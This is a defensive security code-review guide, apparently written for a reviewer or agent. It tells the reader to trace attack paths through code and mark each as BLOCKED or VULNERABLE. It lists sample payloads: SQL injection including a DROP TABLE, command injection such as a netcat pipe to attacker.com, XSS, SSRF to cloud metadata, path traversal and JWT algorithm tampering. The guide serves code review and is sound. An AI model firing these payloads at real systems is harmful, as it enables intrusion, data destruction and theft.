# Attack Emulation Guide

For each vulnerability class, follow the specific emulation methodology below. Walk through the code as an attacker would, tracing data flow from entry point to impact.

## General Methodology

For every attack path from the threat model:

1. **Identify the entry point** — exact function, endpoint, or input field
2. **Craft a malicious input** — the specific payload an attacker would send
3. **Trace the data flow** — follow the input through every function, transformation, and branch
4. **Identify the sink** — where the input reaches a dangerous operation (query, command, render, file write)
5. **Check for controls** — is there validation, encoding, or authorization between entry and sink?
6. **Verdict** — BLOCKED if a control stops the attack, VULNERABLE if it reaches the sink unmitigated

Document each emulation as:
```
[PATH-N] <attack name>
Entry: <function/endpoint>
Payload: <concrete example>
Flow: <entry> → <step> → <step> → <sink>
Control: <what stops it, or "NONE">
Verdict: BLOCKED | VULNERABLE
```

## Injection Emulation

### SQL Injection
- Payloads to trace: `' OR 1=1 --`, `'; DROP TABLE users; --`, `' UNION SELECT password FROM users --`
- Verify: Is the query parameterized? Does the ORM escape properly? Are any raw SQL concatenations present?
- Check stored procedures for dynamic SQL within them

### Command Injection
- Payloads to trace: `; cat /etc/passwd`, `$(whoami)`, `` `id` ``, `| nc attacker.com 4444`
- Verify: Is subprocess called with `shell=False` and array args? Is `os.system()` or `exec()` used?
- Check for indirect injection via filenames, env vars, or config values

### XSS (Cross-Site Scripting)
- Payloads to trace: `<script>alert(1)</script>`, `" onmouseover="alert(1)`, `javascript:alert(1)`
- Verify: Is output encoded for the correct context (HTML body, attribute, JS, CSS, URL)?
- Check: Does CSP header exist and block inline scripts?

### Template Injection
- Payloads to trace: `{{7*7}}` (Jinja2), `${7*7}` (Freemarker), `<%= 7*7 %>` (ERB)
- Verify: Is user input passed to template rendering? Is sandboxing enabled?

## Authentication Emulation

### Brute Force
- Can an attacker make unlimited login attempts? Check for rate limiting, lockout, CAPTCHA.
- Is timing constant? Can failed vs. successful logins be distinguished by response time?

### Session Attacks
- Are session tokens in URLs (referer leakage)?
- Is session ID regenerated after login?
- Are cookies set with Secure, HttpOnly, SameSite flags?
- Can an attacker fixate a session by pre-setting a session ID?

### Token Forgery
- For JWTs: change `alg` to `none`, change `alg` from RS256 to HS256 (key confusion), modify claims without re-signing
- For API keys: are they sufficiently random? Can they be enumerated?

## Authorization Emulation

### IDOR
- Take a valid request for resource A owned by user 1
- Change the resource ID to resource B owned by user 2
- Does the server check ownership? Trace the authorization logic.

### Privilege Escalation
- Take a regular user's request. Add admin parameters (`admin=true`, `role=admin`)
- Access admin-only endpoints with regular user tokens
- Check: are role checks in middleware/decorator or only at the route level?

### Horizontal Traversal
- User A tries to access User B's data by manipulating IDs, paths, or query filters
- Verify: does every data access query include a user/tenant scope?

## Data Exposure Emulation

### Information Leakage
- Trigger errors (invalid input, missing resources, server errors). Do responses contain stack traces, SQL queries, internal paths?
- Check API responses: do they return more fields than the client needs? (over-fetching)
- Review logs: do they contain PII, tokens, passwords?

### Secrets Exposure
- Search codebase for: API keys, passwords, tokens, connection strings, private keys
- Check: `.env` files, config files, CI/CD configs, Docker files, terraform state
- Are secrets in environment variables or a proper secret store?

## Infrastructure Emulation

### SSRF (Server-Side Request Forgery)
- Payloads to trace: `http://169.254.169.254/latest/meta-data/` (AWS metadata), `http://localhost:6379` (Redis), `file:///etc/passwd`
- Verify: does the application make HTTP requests based on user input? Is there URL validation?

### Path Traversal
- Payloads to trace: `../../etc/passwd`, `..%2f..%2fetc/passwd`, `....//....//etc/passwd`
- Verify: is the file path constructed from user input? Is it canonicalized and compared to an allowlist?

### Deserialization
- If the application deserializes data from users (pickle, Java serialization, YAML.load, PHP unserialize):
- Can an attacker craft a payload that executes code during deserialization?
- Verify: is a safe loader used? Are types restricted?

## Logic Emulation

### Race Conditions
- Identify state-changing operations (balance deduction, inventory decrement, permission grant)
- Could two concurrent requests both pass the check before either completes the update?
- Verify: are atomic operations, transactions, or locks used?

### Business Logic Bypass
- Can steps be skipped? (e.g., go from cart to confirmation without payment)
- Can negative values be submitted? (e.g., negative quantity to get a credit)
- Can operations be replayed? (e.g., applying a coupon multiple times)

### Denial of Service
- Can an unauthenticated user trigger expensive operations? (complex queries, large file processing, regex)
- Are there size limits on uploads, request bodies, and query parameters?
- Can resources be exhausted? (connection pool, disk space, memory via decompression bombs)

## Verdict Criteria

**BLOCKED**: A control exists in the code path between entry and sink that would prevent exploitation. The control handles the specific payload class (not just one variant).

**VULNERABLE**: No control exists, or the control is bypassable (e.g., client-side only, wrong encoding context, regex that can be evaded).

When uncertain, err on the side of VULNERABLE and flag for mitigation.
